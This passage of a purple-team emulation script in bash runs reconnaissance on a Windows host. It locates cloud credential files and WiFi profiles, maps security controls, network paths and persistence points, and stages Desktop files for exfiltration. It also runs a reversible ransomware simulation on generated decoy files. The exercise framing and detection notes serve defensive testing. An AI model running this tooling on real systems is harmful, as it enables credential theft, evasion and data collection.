    print_action "Scanning for cloud provider credential files..."
    local cloud_found=0
    local cloud_paths=(
        "$WINDOWS_SYSTEM/Users/*/.aws/credentials"
        "$WINDOWS_SYSTEM/Users/*/.azure/accessTokens.json"
        "$WINDOWS_SYSTEM/Users/*/.config/gcloud/credentials.db"
        "$WINDOWS_SYSTEM/Users/*/.config/gcloud/application_default_credentials.json"
    )
    for cpath in "${cloud_paths[@]}"; do
        for f in $cpath; do
            if [ -f "$f" ] 2>/dev/null; then
                print_detail "Cloud cred: $f"
                log_text 8 "[CLOUD CRED] $f"
                ((cloud_found++))
            fi
        done
    done
    if [ $cloud_found -gt 0 ]; then
        print_success "Found $cloud_found cloud credential files" "T1552.001"
        print_finding "HIGH" "Cloud provider credentials accessible (AWS/Azure/GCP)"
    else
        print_info "No cloud credential files found"
        ((SKIPPED_ACTIONS++))
    fi

    # WiFi passwords
    execute_ps \
        "netsh wlan show profiles 2>\$null | Select-String 'All User Profile' | ForEach-Object { \$p = (\$_ -split ':')[1].Trim(); Write-Output \"Profile: \$p\" }" \
        "T1552.006" \
        "Saved WiFi profiles (password extraction targets)"

    end_phase
}

# ============================================================================
# PHASE 6: DEFENSE EVASION RECONNAISSANCE
# Understand what the blue team can see, find blind spots
# ============================================================================

phase_defense_evasion_recon() {
    begin_phase 6 "Defense Evasion Reconnaissance" \
        "T1562.001, T1562.004, T1218, T1036, T1027" \
        "Map security controls, logging config, AMSI, AppLocker, firewall rules"

    # PowerShell logging configuration
    execute_ps \
        "Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -ErrorAction SilentlyContinue | Format-List; Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' -ErrorAction SilentlyContinue | Format-List; Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue | Format-List" \
        "T1562.001" \
        "PowerShell logging configuration (ScriptBlock, Module, Transcription)"

    # Sysmon presence and config
    execute_ps \
        "\$svc = Get-Service Sysmon* -ErrorAction SilentlyContinue; if (\$svc) { \$svc | Format-List Name,DisplayName,Status; Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\SysmonDrv' -ErrorAction SilentlyContinue | Select-Object ImagePath | Format-List } else { Write-Output 'Sysmon not installed' }" \
        "T1518.001" \
        "Sysmon presence and driver path"

    # Windows Firewall rules
    execute_ps \
        "Get-NetFirewallProfile | Select-Object Name,Enabled,DefaultInboundAction,DefaultOutboundAction,LogAllowed,LogBlocked,LogFileName | Format-Table -AutoSize" \
        "T1562.004" \
        "Windows Firewall profile status"

    execute_ps \
        "Get-NetFirewallRule -Direction Inbound -Enabled True -Action Allow -ErrorAction SilentlyContinue | Select-Object -First 20 DisplayName,Profile,Protocol,LocalPort | Format-Table -AutoSize" \
        "T1562.004" \
        "Inbound firewall allow rules (attack surface)"

    # AppLocker policy
    execute_ps \
        "Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue | Select-Object -ExpandProperty RuleCollections | Select-Object -First 10 | Format-Table" \
        "T1562.001" \
        "AppLocker policy (application whitelisting)"

    # AMSI providers
    execute_ps \
        "Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers' -ErrorAction SilentlyContinue | ForEach-Object { Write-Output \"AMSI Provider: \$(\$_.PSChildName)\" }" \
        "T1562.001" \
        "AMSI providers (anti-malware scan interface)"

    # Event log sizes and retention
    execute_ps \
        "Get-WinEvent -ListLog Security,System,Application,'Microsoft-Windows-Sysmon/Operational','Microsoft-Windows-PowerShell/Operational' -ErrorAction SilentlyContinue | Select-Object LogName,IsEnabled,MaximumSizeInBytes,RecordCount,LogMode | Format-Table -AutoSize" \
        "T1562.002" \
        "Event log configuration (size, retention, status)"

    # Audit policy
    execute_ps \
        "auditpol /get /category:* 2>\$null | Select-String -Pattern 'Success|Failure' | Select-Object -First 20" \
        "T1562.002" \
        "Windows audit policy settings"

    # WDAC / Device Guard
    execute_ps \
        "Get-CimInstance -ClassName Win32_DeviceGuard -Namespace 'root\Microsoft\Windows\DeviceGuard' -ErrorAction SilentlyContinue | Select-Object * | Format-List" \
        "T1562.001" \
        "Device Guard / WDAC status"

    # Constrained Language Mode check
    execute_ps \
        "\$ExecutionContext.SessionState.LanguageMode" \
        "T1562.001" \
        "PowerShell language mode (constrained = hardened)"

    # LSA protection
    execute_ps \
        "Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -ErrorAction SilentlyContinue | Select-Object RunAsPPL,LimitBlankPasswordUse,NoLMHash,RestrictAnonymous | Format-List" \
        "T1003" \
        "LSA protection and credential hardening"

    # Credential Guard
    execute_ps \
        "Get-CimInstance -ClassName Win32_DeviceGuard -Namespace 'root\Microsoft\Windows\DeviceGuard' -ErrorAction SilentlyContinue | Select-Object SecurityServicesRunning,VirtualizationBasedSecurityStatus | Format-List" \
        "T1003" \
        "Credential Guard / VBS status"

    # Windows Event Forwarding
    execute_ps \
        "Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager' -ErrorAction SilentlyContinue | Format-List" \
        "T1562.002" \
        "Windows Event Forwarding configuration"

    # ETW providers (advanced telemetry)
    execute_ps \
        "logman query providers 2>\$null | Select-String -Pattern 'Microsoft-Windows-Security|Microsoft-Windows-Sysmon|Microsoft-Windows-PowerShell' | Select-Object -First 10" \
        "T1562.006" \
        "ETW providers (telemetry sources)"

    end_phase
}

# ============================================================================
# PHASE 7: NETWORK TOPOLOGY & LATERAL MOVEMENT RECON
# Map the network for pivot points, domain trusts, internal services
# ============================================================================

phase_network_discovery() {
    begin_phase 7 "Network Topology & Lateral Movement Recon" \
        "T1049, T1018, T1016, T1135, T1046, T1482" \
        "Map network interfaces, connections, shares, trusts, and pivot points"

    execute_ps \
        "Get-NetIPConfiguration | Select-Object InterfaceAlias,IPv4Address,IPv4DefaultGateway,DNSServer | Format-List" \
        "T1016" \
        "Network interface configuration"

    execute_ps \
        "Get-NetAdapter | Select-Object Name,Status,MacAddress,LinkSpeed,InterfaceDescription | Format-Table -AutoSize" \
        "T1016" \
        "Network adapter enumeration"

    execute_ps \
        "Get-NetTCPConnection | Where-Object {\$_.State -eq 'Established'} | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess | Format-Table -AutoSize" \
        "T1049" \
        "Established TCP connections"

    execute_ps \
        "Get-NetTCPConnection | Where-Object {\$_.State -eq 'Listen'} | Select-Object LocalAddress,LocalPort,OwningProcess | Sort-Object LocalPort | Format-Table -AutoSize" \
        "T1049" \
        "Listening TCP ports (service exposure)"

    execute_ps \
        "Get-SmbShare -ErrorAction SilentlyContinue | Select-Object Name,Path,Description,CurrentUsers | Format-Table -AutoSize" \
        "T1135" \
        "Local SMB shares"

    execute_ps \
        "Get-SmbMapping -ErrorAction SilentlyContinue | Select-Object LocalPath,RemotePath,Status | Format-Table" \
        "T1135" \
        "Mapped network drives (lateral movement paths)"

    execute_ps \
        "Get-NetNeighbor | Where-Object {\$_.State -ne 'Unreachable'} | Select-Object IPAddress,LinkLayerAddress,State,InterfaceAlias | Format-Table -AutoSize" \
        "T1018" \
        "ARP neighbor table (local network hosts)"

    execute_ps \
        "Get-DnsClientCache -ErrorAction SilentlyContinue | Select-Object -First 25 Entry,RecordName,Data | Format-Table -AutoSize" \
        "T1018" \
        "DNS client cache (recently resolved hosts)"

    execute_ps \
        "Get-NetRoute | Where-Object {\$_.DestinationPrefix -ne '0.0.0.0/0' -and \$_.DestinationPrefix -notlike 'ff*' -and \$_.DestinationPrefix -notlike 'fe*'} | Select-Object -First 15 DestinationPrefix,NextHop,InterfaceAlias,RouteMetric | Format-Table" \
        "T1016" \
        "Routing table (network segmentation map)"

    execute_ps \
        "try { nltest /domain_trusts 2>\$null } catch { Write-Output 'Domain trust enumeration not available' }" \
        "T1482" \
        "Active Directory domain trusts"

    execute_ps \
        "Get-ItemProperty 'HKCU:\Software\Microsoft\Terminal Server Client\Servers\*' -ErrorAction SilentlyContinue | Select-Object PSChildName,UsernameHint | Format-Table" \
        "T1018" \
        "RDP connection history (previous lateral movement targets)"

    execute_ps \
        "netsh interface portproxy show all 2>\$null" \
        "T1090" \
        "Port proxy / forwarding rules"

    # VPN connections
    execute_ps \
        "Get-VpnConnection -ErrorAction SilentlyContinue | Select-Object Name,ServerAddress,ConnectionStatus,TunnelType | Format-Table" \
        "T1133" \
        "VPN connections (external access paths)"

    # WiFi interfaces and profiles
    execute_ps \
        "netsh wlan show interfaces 2>\$null | Select-String 'Name|State|SSID|BSSID|Signal'" \
        "T1016" \
        "WiFi interface status and connected network"

    # Hosts file tampering check
    execute_ps \
        "Get-Content 'C:\Windows\System32\drivers\etc\hosts' -ErrorAction SilentlyContinue | Where-Object {\$_ -notmatch '^#' -and \$_.Trim() -ne ''}" \
        "T1565.001" \
        "Hosts file entries (DNS override / tampering)"

    end_phase
}

# ============================================================================
# PHASE 8: COLLECTION & STAGING
# Gather high-value data, stage for exfiltration
# ============================================================================

phase_automated_collection() {
    begin_phase 8 "Collection & Staging" \
        "T1119, T1005, T1074.001, T1114.001, T1113" \
        "Collect high-value documents, emails, and stage for exfiltration review"

    ((TOTAL_ACTIONS++))
    local collection_dir
    collection_dir="/tmp/collected_data_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$collection_dir" 2>/dev/null

    if [ ! -d "$collection_dir" ]; then
        print_error "Failed to create collection directory" "T1074.001"
        return 1
    fi

    print_action "Staging directory: $collection_dir"

    local collected_count=0
    local file_size_limit=10240

    {
        printf '    %s Collection & Staging\n' "$B_TL$B_H"
        printf '    %s  Staging directory: %s\n' "$B_V" "$collection_dir"
        printf '    %s  Size limit: %d bytes\n' "$B_V" "$file_size_limit"
        printf '    %s\n' "$B_V"
    } >> "$LOG_FILE"

    for file in $(safe_find "$WINDOWS_SYSTEM/Users/*/Desktop" "*.txt" 5); do
        if [ -f "$file" ] && [ -r "$file" ]; then
            local fsize
            fsize=$(stat -c%s "$file" 2>/dev/null || echo 999999)
            if [ "$fsize" -lt "$file_size_limit" ]; then
                cp "$file" "$collection_dir/" 2>/dev/null && {
                    printf '    %s  [STAGED] %s (%s bytes)\n' "$B_V" "$file" "$fsize" >> "$LOG_FILE"
                    ((collected_count++))
                }
            fi
        fi
    done

    {
        printf '    %s\n' "$B_V"
        printf '    %s  Total staged: %d files\n' "$B_V" "$collected_count"
        printf '    %s\n' "$B_BL$B_H"
    } >> "$LOG_FILE"

    if [ $collected_count -gt 0 ]; then
        print_success "Staged $collected_count files for review" "T1074.001"
    else
        print_info "No files staged (access restrictions or empty directories)"
        rmdir "$collection_dir" 2>/dev/null
        ((FAILED_ACTIONS++))
    fi

    # Email file discovery
    execute_ps \
        "Get-ChildItem -Path C:\Users -Recurse -Include *.pst,*.ost,*.eml,*.msg -ErrorAction SilentlyContinue | Select-Object -First 10 FullName,Length,LastWriteTime | Format-Table -AutoSize" \
        "T1114.001" \
        "Email archive files (.pst, .ost, .eml, .msg)"

    # Clipboard content
    execute_ps \
        "try { Get-Clipboard -ErrorAction SilentlyContinue | Select-Object -First 5 } catch { Write-Output 'Clipboard not accessible' }" \
        "T1115" \
        "Current clipboard contents"

    # Recent Office documents
    execute_ps \
        "Get-ChildItem 'C:\Users\*\AppData\Roaming\Microsoft\Office\Recent' -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 15 Name,LastWriteTime | Format-Table" \
        "T1005" \
        "Recently opened Office documents"

    # Downloads folder profiling
    execute_ps \
        "Get-ChildItem 'C:\Users\*\Downloads' -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 15 Name,Length,LastWriteTime | Format-Table -AutoSize" \
        "T1005" \
        "Downloads folder contents (recent activity)"

    end_phase
}

# ============================================================================
# PHASE 9: PERSISTENCE MECHANISM RECONNAISSANCE
# Comprehensive persistence vector mapping
# ============================================================================

phase_persistence_recon() {
    begin_phase 9 "Persistence Mechanism Reconnaissance" \
        "T1547.001, T1053.005, T1543.003, T1546.003, T1574.001, T1546.015" \
        "Map all persistence vectors: startup, tasks, services, WMI, COM, DLL hijack"

    # Registry Run keys (comprehensive)
    execute_ps \
        "Write-Output '--- HKLM Run ---'; Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -ErrorAction SilentlyContinue | Format-List; Write-Output '--- HKLM RunOnce ---'; Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' -ErrorAction SilentlyContinue | Format-List; Write-Output '--- HKCU Run ---'; Get-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -ErrorAction SilentlyContinue | Format-List; Write-Output '--- HKCU RunOnce ---'; Get-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' -ErrorAction SilentlyContinue | Format-List" \
        "T1547.001" \
        "Registry Run/RunOnce keys (all hives)"

    # Startup folder
    execute_ps \
        "Get-ChildItem 'C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' -ErrorAction SilentlyContinue | Select-Object FullName,LastWriteTime | Format-Table; Get-ChildItem 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup' -ErrorAction SilentlyContinue | Select-Object FullName,LastWriteTime | Format-Table" \
        "T1547.001" \
        "User and system startup folders"

    # Scheduled tasks (detailed)
    execute_ps \
        "Get-ScheduledTask | Where-Object {\$_.State -eq 'Ready'} | ForEach-Object { [PSCustomObject]@{Name=\$_.TaskName; Path=\$_.TaskPath; State=\$_.State; Author=\$_.Author; Actions=(\$_.Actions | ForEach-Object { \$_.Execute }) -join ', '} } | Select-Object -First 25 | Format-Table -AutoSize -Wrap" \
        "T1053.005" \
        "Active scheduled tasks with action details"

    # Auto-start services with binary paths (writable service binaries = escalation)
    execute_ps \
        "Get-WmiObject Win32_Service | Where-Object {\$_.StartMode -eq 'Auto' -and \$_.State -eq 'Running'} | Select-Object -First 25 Name,DisplayName,PathName,StartMode | Format-Table -AutoSize -Wrap" \
        "T1543.003" \
        "Auto-start services with binary paths"

    # Unquoted service paths (privilege escalation vector)
    execute_ps \
        'Get-WmiObject Win32_Service | Where-Object {$_.PathName -and $_.PathName -notmatch '"'"'^"'"'"' -and $_.PathName -match '"'"' '"'"'} | Select-Object Name,PathName,StartMode | Format-Table -AutoSize -Wrap' \
        "T1574.009" \
        "Unquoted service paths (privilege escalation)"

    # WMI event subscriptions
    execute_ps \
        "Get-WmiObject -Namespace root\Subscription -Class __EventFilter -ErrorAction SilentlyContinue | Select-Object Name,Query | Format-Table; Get-WmiObject -Namespace root\Subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue | Select-Object Name,CommandLineTemplate | Format-Table" \
        "T1546.003" \
        "WMI event subscriptions (stealthy persistence)"

    # COM object hijacking opportunities
    execute_ps \
        'Get-ItemProperty "HKCU:\Software\Classes\CLSID\*\InProcServer32" -ErrorAction SilentlyContinue | Where-Object {$_."(default)" -ne $null} | Select-Object -First 10 PSPath,"(default)" | Format-Table' \
        "T1546.015" \
        "COM object registrations (hijack opportunities)"

    # DLL search order hijack — writable directories in PATH
    execute_ps \
        "\$env:PATH -split ';' | ForEach-Object { if (\$_ -and (Test-Path \$_ -ErrorAction SilentlyContinue)) { \$acl = Get-Acl \$_ -ErrorAction SilentlyContinue; [PSCustomObject]@{Path=\$_; Owner=\$acl.Owner} } } | Format-Table -AutoSize" \
        "T1574.001" \
        "PATH directories and ownership (DLL hijack surface)"

    # Boot Execute
    execute_ps \
        "Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager' -ErrorAction SilentlyContinue | Select-Object BootExecute | Format-List" \
        "T1547" \
        "Boot execute programs"

    end_phase
}

# ============================================================================
# RANSOMWARE SIMULATION HELPERS
# Create fake corporate files, encrypt them, and provide decryption
# All operations happen inside RANSOM_SIM_DIR (/tmp) — never touches real data
# Uses openssl AES-256-CBC with a fixed key so the operator can always decrypt
# ============================================================================

create_sample_file() {
    local filepath="$1" content="$2"
    printf '%s\n' "$content" > "$filepath"
}

build_corporate_directory_tree() {
    local base="$1"
    print_action "Building simulated corporate directory tree..."
    ((TOTAL_ACTIONS++))

    local dirs=(
        "$base/Finance/Q4_Reports"
        "$base/Finance/Invoices"
        "$base/Finance/Tax_Records"
        "$base/HR/Employee_Records"
        "$base/HR/Payroll"
        "$base/Legal/Contracts"
        "$base/Legal/Compliance"
        "$base/Executive/Board_Minutes"
        "$base/Executive/Strategy"
        "$base/IT/Network_Diagrams"
        "$base/IT/Credentials"
        "$base/Operations/SOPs"
    )

    for d in "${dirs[@]}"; do
        mkdir -p "$d"
    done

    create_sample_file "$base/Finance/Q4_Reports/quarterly_revenue_2024.csv" \
"Region,Q1,Q2,Q3,Q4
North America,12500000,13200000,14100000,15800000
EMEA,8700000,9100000,9800000,10500000
APAC,5400000,5900000,6300000,7100000"

    create_sample_file "$base/Finance/Invoices/invoice_8847.txt" \
"INVOICE #8847
Vendor: Acme Consulting LLC
Amount: \$45,000.00
Due Date: 2024-12-15
Payment Terms: Net 30
[PURPLE TEAM SIMULATION FILE]"

    create_sample_file "$base/Finance/Tax_Records/tax_summary_2023.csv" \
"Category,Amount
Gross Revenue,98450000
Operating Expenses,67230000
Net Income,31220000
Tax Rate,21%
Tax Liability,6556200
[PURPLE TEAM SIMULATION FILE]"

    create_sample_file "$base/HR/Employee_Records/employee_directory.csv" \
"ID,Name,Department,Title,Salary
1001,John Smith,Finance,CFO,285000
1002,Jane Doe,Legal,General Counsel,265000
1003,Bob Wilson,IT,CISO,245000
1004,Alice Brown,HR,VP Human Resources,225000
[PURPLE TEAM SIMULATION FILE]"

    create_sample_file "$base/HR/Payroll/payroll_oct_2024.csv" \
"Employee,Gross,Federal,State,Net
John Smith,23750,4987,1662,17101
Jane Doe,22083,4637,1546,15900
[PURPLE TEAM SIMULATION FILE]"

    create_sample_file "$base/Legal/Contracts/vendor_agreement_draft.txt" \
"MASTER SERVICES AGREEMENT — DRAFT
Between: Organization and SecureVault Technologies
Value: \$2,400,000 over 36 months
Effective Date: January 1, 2025
Confidentiality: Level 3 — Restricted
[PURPLE TEAM SIMULATION FILE]"

    create_sample_file "$base/Legal/Compliance/audit_findings_2024.txt" \
"INTERNAL AUDIT REPORT — CONFIDENTIAL
Finding 1: Insufficient MFA coverage on VPN endpoints
Finding 2: Service accounts with non-rotating passwords
Finding 3: Unencrypted PII in staging database
Remediation deadline: Q1 2025
[PURPLE TEAM SIMULATION FILE]"

    create_sample_file "$base/Executive/Board_Minutes/board_minutes_sept.txt" \
"BOARD OF DIRECTORS MEETING MINUTES
Date: September 15, 2024
Topic: Q3 Financial Review and M&A Pipeline
Decision: Approved acquisition target shortlist
Budget Allocation: \$50M authorized for due diligence
[PURPLE TEAM SIMULATION FILE]"

    create_sample_file "$base/Executive/Strategy/strategic_plan_2025.txt" \
"STRATEGIC PLAN 2025 — CONFIDENTIAL
Priority 1: Cloud migration (AWS/Azure hybrid)
Priority 2: Regulatory compliance (SOX, GDPR, PCI-DSS)
Priority 3: Digital banking platform launch
Capital expenditure budget: \$120M
[PURPLE TEAM SIMULATION FILE]"

    create_sample_file "$base/IT/Network_Diagrams/network_topology.txt" \
"NETWORK TOPOLOGY — INTERNAL USE ONLY
DMZ: 10.0.1.0/24 (web servers, WAF)
Corporate: 10.0.10.0/24 (workstations)
Server VLAN: 10.0.20.0/24 (AD, SQL, Exchange)
Management: 10.0.99.0/24 (jump boxes, SIEM)
VPN Pool: 172.16.0.0/16
[PURPLE TEAM SIMULATION FILE]"

    create_sample_file "$base/IT/Credentials/service_accounts.txt" \
"SERVICE ACCOUNT INVENTORY — HIGHLY CONFIDENTIAL
svc_backup — Active Directory backup service
svc_sql_prod — Production SQL Server
svc_exchange — Exchange mail flow
NOTE: All passwords stored in CyberArk vault
[PURPLE TEAM SIMULATION FILE]"

    create_sample_file "$base/Operations/SOPs/incident_response_plan.txt" \
"INCIDENT RESPONSE PLAN v3.1
Step 1: Detect and classify (SOC L1)
Step 2: Contain affected systems (SOC L2)
Step 3: Eradicate threat (IR team)
Step 4: Recover and restore (IT ops)
Step 5: Post-incident review (CISO)
Ransomware playbook: See Appendix C
[PURPLE TEAM SIMULATION FILE]"

    local file_count
    file_count=$(find "$base" -type f ! -name ".*" | wc -l)
    print_success "Created $file_count sample corporate files across ${#dirs[@]} directories" "T1486"
    print_detail "Location: $base"

    {
        printf '    %s Corporate Directory Tree\n' "$B_TL$B_H"
        find "$base" -type f ! -name ".*" | sort | sed "s|$base/||" | sed "s/^/    $B_V  /"
        printf '    %s  Total: %d files\n' "$B_V" "$file_count"
        printf '    %s\n' "$B_BL$B_H"
    } >> "$LOG_FILE"
}

encrypt_simulation_files() {
    local base="$1"
    print_action "Encrypting files with AES-256-CBC (reversible)..."
    ((TOTAL_ACTIONS++))

    if ! command -v openssl &>/dev/null; then
        print_error "openssl not found — cannot perform encryption simulation" "T1486"
        return 1
    fi

    local encrypted=0 failed=0
    : > "$RANSOM_MANIFEST"

    {
        printf '    %s Encryption Simulation\n' "$B_TL$B_H"
        printf '    %s  Algorithm: AES-256-CBC (openssl)\n' "$B_V"
        printf '    %s  Key: %s\n' "$B_V" "$RANSOM_KEY"
        printf '    %s  Extension: %s\n' "$B_V" "$RANSOM_EXT"
        printf '    %s\n' "$B_V"
    } >> "$LOG_FILE"

    while IFS= read -r file; do
        local rel_path="${file#"$base"/}"
        if openssl enc -aes-256-cbc -salt -pbkdf2 -in "$file" -out "${file}${RANSOM_EXT}" -pass "pass:${RANSOM_KEY}" 2>/dev/null; then
            rm -f "$file"
            printf '%s\n' "$rel_path" >> "$RANSOM_MANIFEST"
            printf '    %s  [ENCRYPTED] %s → %s%s\n' "$B_V" "$rel_path" "$rel_path" "$RANSOM_EXT" >> "$LOG_FILE"
            ((encrypted++))
        else
            printf '    %s  [FAILED]    %s\n' "$B_V" "$rel_path" >> "$LOG_FILE"
            ((failed++))
        fi
    done < <(find "$base" -type f ! -name ".*" ! -name "*${RANSOM_EXT}" 2>/dev/null)

    {
        printf '    %s\n' "$B_V"
        printf '    %s  Encrypted: %d | Failed: %d\n' "$B_V" "$encrypted" "$failed"
        printf '    %s\n' "$B_BL$B_H"
    } >> "$LOG_FILE"

    if [ $encrypted -gt 0 ]; then
        print_success "Encrypted $encrypted files (originals replaced with ${RANSOM_EXT} versions)" "T1486"
        print_finding "HIGH" "$encrypted files encrypted — decrypt with: $0 --decrypt"
    else
        print_error "Encryption simulation failed" "T1486"
    fi
}

drop_ransom_notes() {
    local base="$1"
    print_action "Dropping ransom notes across directories..."
    ((TOTAL_ACTIONS++))

    local note_count=0
    local note_content
    note_content=$(cat <<'RANSOMNOTE'
╔══════════════════════════════════════════════════════════════╗
║              PURPLE TEAM EXERCISE — ENCRYPTED               ║
║                 RANSOMWARE SIMULATION NOTE                   ║
╚══════════════════════════════════════════════════════════════╝

  ⚠  YOUR FILES HAVE BEEN ENCRYPTED  ⚠

  All documents in this directory have been encrypted using
  AES-256-CBC encryption. The originals have been replaced.

  To recover your files, run:

      ./agent.sh --decrypt

  ─── SIMULATION CONTEXT ───

  In a real ransomware attack, this note would demand:
    • Cryptocurrency payment (BTC/XMR)
    • Payment within 72 hours or data leak
    • Double extortion: pay to decrypt AND prevent data leak
    • Contact via Tor onion site or secure email

  Blue Team Detection Opportunities:
    ✓ Mass file rename (original → .locked extension)
    ✓ High disk I/O from rapid encryption
    ✓ Ransom note creation across multiple directories
    ✓ Canary file triggers (if honeypot files are in place)
    ✓ Unusual process tree: WSL → bash → openssl

  MITRE ATT&CK: T1486 (Data Encrypted for Impact)

  THIS IS A PURPLE TEAM EXERCISE — ALL FILES ARE RECOVERABLE
RANSOMNOTE
)

    while IFS= read -r dir; do
        printf '%s\n' "$note_content" > "$dir/!_README_PURPLETEAM_!.txt"
        ((note_count++))
    done < <(find "$base" -type d 2>/dev/null)

    if [ $note_count -gt 0 ]; then
        print_success "Dropped $note_count ransom notes across directory tree" "T1486"
    else
        print_error "Failed to create ransom notes" "T1486"
    fi
}

decrypt_ransomware_simulation() {
    printf '%b' "$C_CYAN"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════════════════╗
║               PURPLE TEAM — RANSOMWARE DECRYPTION                        ║
╚══════════════════════════════════════════════════════════════════════════╝
EOF
    printf '%b\n' "$C_RESET"

    if [ ! -d "$RANSOM_SIM_DIR" ]; then
        printf '%b[✗]%b No ransomware simulation found at %s\n' "$C_RED" "$C_RESET" "$RANSOM_SIM_DIR"
        printf '    Run the agent with --phase 10 first to create the simulation.\n'
        exit 1
    fi

    if [ ! -f "$RANSOM_MANIFEST" ]; then
        printf '%b[✗]%b Manifest file not found — cannot determine which files to decrypt\n' "$C_RED" "$C_RESET"
        exit 1
    fi

    printf '%b[i]%b Decrypting files in %s ...\n' "$C_BLUE" "$C_RESET" "$RANSOM_SIM_DIR"

    local decrypted=0 failed=0

    while IFS= read -r rel_path; do
        local enc_file="${RANSOM_SIM_DIR}/${rel_path}${RANSOM_EXT}"
        local out_file="${RANSOM_SIM_DIR}/${rel_path}"

        if [ ! -f "$enc_file" ]; then
            printf '    %b[!]%b Skip (not found): %s\n' "$C_YELLOW" "$C_RESET" "$rel_path"
            continue
        fi

        local out_dir
        out_dir=$(dirname "$out_file")
        mkdir -p "$out_dir" 2>/dev/null

        if openssl enc -aes-256-cbc -d -salt -pbkdf2 -in "$enc_file" -out "$out_file" -pass "pass:${RANSOM_KEY}" 2>/dev/null; then
            rm -f "$enc_file"
            printf '    %b[✓]%b Decrypted: %s\n' "$C_GREEN" "$C_RESET" "$rel_path"
            ((decrypted++))
        else
            printf '    %b[✗]%b Failed:    %s\n' "$C_RED" "$C_RESET" "$rel_path"
            ((failed++))
        fi
    done < "$RANSOM_MANIFEST"

    # Remove ransom notes
    find "$RANSOM_SIM_DIR" -name '!_README_PURPLETEAM_!.txt' -delete 2>/dev/null

    printf '\n'
    printf '%b[✓]%b Decryption complete: %d recovered, %d failed\n' "$C_GREEN" "$C_RESET" "$decrypted" "$failed"
    printf '%b[i]%b Files restored to: %s\n' "$C_BLUE" "$C_RESET" "$RANSOM_SIM_DIR"

    if [ $failed -eq 0 ] && [ $decrypted -gt 0 ]; then
        rm -f "$RANSOM_MANIFEST"
        printf '%b[i]%b Manifest cleared — simulation fully reversed\n\n' "$C_BLUE" "$C_RESET"
    fi
}

cleanup_ransomware_simulation() {
    printf '%b' "$C_CYAN"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════════════════╗
║               PURPLE TEAM — SIMULATION CLEANUP                           ║
╚══════════════════════════════════════════════════════════════════════════╝
EOF
    printf '%b\n' "$C_RESET"

    if [ -d "$RANSOM_SIM_DIR" ]; then
        rm -rf "$RANSOM_SIM_DIR"
        printf '%b[✓]%b Removed simulation directory: %s\n' "$C_GREEN" "$C_RESET" "$RANSOM_SIM_DIR"
    else
        printf '%b[i]%b No simulation directory found at %s\n' "$C_BLUE" "$C_RESET" "$RANSOM_SIM_DIR"
    fi

    if [ -f "/tmp/RANSOMWARE_NOTE_PURPLETEAM.txt" ]; then
        rm -f "/tmp/RANSOMWARE_NOTE_PURPLETEAM.txt"
        printf '%b[✓]%b Removed legacy ransom note\n' "$C_GREEN" "$C_RESET"
    fi

    printf '\n%b[✓]%b Cleanup complete\n\n' "$C_GREEN" "$C_RESET"
}

# ============================================================================
# PHASE 10: IMPACT SIMULATION (Ransomware TTPs)
# Creates fake corporate files, encrypts them, drops ransom notes
# Everything is reversible with --decrypt
# ============================================================================

phase_impact_simulation() {
    begin_phase 10 "Impact Simulation ${C_YELLOW}(Reversible Encryption)${C_RESET}" \
        "T1486, T1490, T1489, T1529, T1485" \
        "Simulate ransomware: create targets, encrypt with AES-256, drop ransom notes"

    print_warning "CONTROLLED SIMULATION — all operations are in $RANSOM_SIM_DIR"
    print_info "Decrypt with: $0 --decrypt"
    print_info "Full cleanup: $0 --cleanup"
    printf '\n'

    # Shadow copies
    execute_ps \
        "Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue | Select-Object ID,VolumeName,InstallDate,DeviceObject | Format-Table -AutoSize" \
        "T1490" \
        "Volume Shadow Copy enumeration"

    # VSS service
    execute_ps \
        "Get-Service VSS -ErrorAction SilentlyContinue | Select-Object Name,DisplayName,Status,StartType | Format-List" \
        "T1490" \
        "Volume Shadow Copy Service status"

    # Windows backup
    execute_ps \
        "Get-WBSummary -ErrorAction SilentlyContinue | Format-List; Get-WBPolicy -ErrorAction SilentlyContinue | Format-List" \
        "T1490" \
        "Windows Backup configuration and last run"

    # Backup and recovery services
    execute_ps \
        "Get-Service | Where-Object {\$_.Name -match 'backup|vss|wbengine|sql|exchange|vmware|veeam|acronis|commvault|netbackup|arcserve'} | Select-Object Name,DisplayName,Status,StartType | Format-Table -AutoSize" \
        "T1489" \
        "Backup and business-critical services"

    # Database services
    execute_ps \
        "Get-Service | Where-Object {\$_.Name -match 'MSSQL|MySQL|postgres|oracle|mongodb|redis|elasticsearch|MariaDB'} | Select-Object Name,DisplayName,Status,StartType | Format-Table -AutoSize" \
        "T1489" \
        "Database service enumeration"

    # Real-world target enumeration on Windows filesystem
    ((TOTAL_ACTIONS++))
    print_action "Counting real encryption targets on Windows filesystem..."

    {
        printf '    %s Ransomware Target Assessment (Windows FS)\n' "$B_TL$B_H"
        printf '    %s  NOTE: Enumeration only — real files are NOT touched\n' "$B_V"
        printf '    %s\n' "$B_V"
    } >> "$LOG_FILE"

